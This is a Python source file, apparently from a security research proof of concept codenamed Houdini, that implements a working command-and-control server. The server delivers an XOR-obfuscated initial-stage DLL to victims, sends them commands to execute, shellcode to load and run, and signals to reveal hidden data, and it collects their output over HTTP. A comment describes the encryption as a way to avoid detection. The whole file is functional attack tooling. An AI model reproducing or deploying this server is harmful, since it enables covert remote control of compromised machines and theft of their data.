#!/usr/bin/env python3

#    Copyright (c) 2020, Frank Block, ERNW Research GmbH <fblock@ernw.de>
#
#       All rights reserved.
#
#       Redistribution and use in source and binary forms, with or without modification,
#       are permitted provided that the following conditions are met:
#
#       * Redistributions of source code must retain the above copyright notice, this
#         list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above copyright notice,
#         this list of conditions and the following disclaimer in the documentation
#         and/or other materials provided with the distribution.
#       * The names of the contributors may not be used to endorse or promote products
#         derived from this software without specific prior written permission.
#
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#       AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#       IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#       ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
#       LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
#       DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
#       SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
#       CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
#       OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import json, argparse, sys, logging, traceback, base64, codecs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# Secret is used to prevent "easy"/accidental detection (e.g. traces of shellcode in heap from network transfer)
# After decrypted and loaded in memory, the shellcode stays unencrypted.
secret = "t0pSecr3t!"
commands_file = 'command.json'
initial_stage = 'houdini_dll.dll'
logging.basicConfig(format='\n%(asctime)s %(levelname)s: %(message)s', level=logging.DEBUG)

class Handler(BaseHTTPRequestHandler):
    def xor_data(self, data):
        """Expects data to be an bytearray"""
        global secret
        l = len(secret)
        for i in range(len(data)):
            if data[i] == 0 or data[i] == ord(secret[i%l]):
                continue
            data[i] = data[i] ^ ord(secret[i%l])
        return data


    def prepare_data(self, input_data, bin_input=False, b64_input=False):
        data = None
        if b64_input:
            data = bytearray(base64.b64decode(input_data))
        elif bin_input:
            data = bytearray(input_data)
        else:
            data = bytearray(input_data.encode("utf-8"))

        data = self.xor_data(data)
        return codecs.encode(data, "hex")


    def decrypt_output(self, data):
        dec_data = bytearray(codecs.decode(data, "hex"))
        dec_data = self.xor_data(dec_data)
        return bytes(dec_data).decode("utf-8")


    def do_POST(self):
        if self.path == '/got_somEthing_for_you':
            try:
                content_length = self.headers.get('Content-Length')
                if content_length:
                    content_length = int(content_length)
                    content = self.rfile.read(content_length)
                    logging.info("[+] Received some data from client:")
                    print(self.decrypt_output(content))
                    print()
                    self.send_response(200)
                    self.end_headers()
            except:
                logging.error("[-] Something went wrong while receiving client data:")
                print(traceback.format_exc())
                print()
                self.send_response(403)
                self.end_headers()

        elif self.path == '/giVe_something_todo':
            # reading new command to execute
            try:
                global commands_file
                command = json.loads(open(commands_file, 'r').read())
                cmd = command['command']
                payload = command['payload']
                enc_payload = None

                if cmd == 'execute_this':
                    dec_payload = base64.b64decode(payload).decode("utf-8")
                    logging.info("[+] Sending victim command to execute:")
                    print(repr(dec_payload))
                    print()
                    enc_payload = self.prepare_data(payload, b64_input=True)

                elif cmd == 'load_shellcode':
                    logging.info("[+] Sending victim given shellcode\n")
                    enc_payload = self.prepare_data(payload, b64_input=True)

                elif cmd == 'run_shellcode':
                    logging.info("[+] Instructing victim to execute previously loaded shellcode\n")
                    enc_payload = self.prepare_data(cmd)

                elif cmd == 'reveal_data':
                    logging.info("[+] Sending victim a signal to reveal any hidden data and sleep for the configured amount of time (default 60 seconds).\n")
                    enc_payload = self.prepare_data(cmd)

                else:
                    logging.error("[-] Command not recognized: {:s}\n".format(cmd))
                    self.send_response(503)
                    self.end_headers()
                    return

                enc_cmd = self.prepare_data(cmd)

                seperator = "_houdini_".encode("ascii")
                content_length = len(enc_cmd) + len(seperator) + len(enc_payload)
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.send_header("Content-Length", str(content_length))
                self.end_headers()
                self.wfile.write(enc_cmd)
                self.wfile.write(seperator)
                self.wfile.write(enc_payload)

            except:
                logging.error("[-] Following error occured while trying to load new command:")
                print(traceback.format_exc())
                print()
                self.send_response(503)
                self.end_headers()


        else:
            logging.warning("[-] Connection received, but wrong path given.\n")
            self.send_response(404)
            self.end_headers()
            return


    def do_GET(self):
        if not self.path == '/initial_sTage':
            logging.warning("[-] Connection received, but wrong path given.\n")
            self.send_response(404)
            self.end_headers()
            return

        logging.info("[+] Delivering initial stage.\n")

        global initial_stage
        isfile = open(initial_stage, 'rb')
        initial_stage = isfile.read()
        isfile.close()
        initial_stage = self.prepare_data(initial_stage, bin_input=True)

        content_length = len(initial_stage)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", str(content_length))
        self.end_headers()
        self.wfile.write(initial_stage)
        return



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Simple C&C Server for shared memory subversion (codename Houdini)")
    parser.add_argument('-c', dest='command_file', type=str, default='command.json', help='a json formatted file, containing a command to execute; default: command.json')
    parser.add_argument('-s', dest='server_address', type=str, default='', help='The IP address to listen on; default 0.0.0.0')
    parser.add_argument('-p', dest='server_port', type=int, default=8000, help='The port to listen on; default 8000')
    parser.add_argument('-i', dest='initial_stage', type=str, default='houdini_dll.dll', help='The DLL containing the intial stage; default: houdini_dll.dll')
    parser.add_argument('--secret', dest='secret', type=str, default="t0pSecr3t!", help='The secret used for the XOR en/decryption; must be the same as in the client executable')

    args = parser.parse_args()
    commands_file = args.command_file
    initial_stage = args.initial_stage
    secret = args.secret

    httpd = ThreadingHTTPServer((args.server_address, args.server_port), Handler)
    logging.info("[+] Starting C&C server\n")
    try:
        httpd.serve_forever()
        logging.info("[+] C&C server is up and running\n")
    except KeyboardInterrupt:
        pass
    logging.info("[+] Shutting C&C server down")
    httpd.server_close()
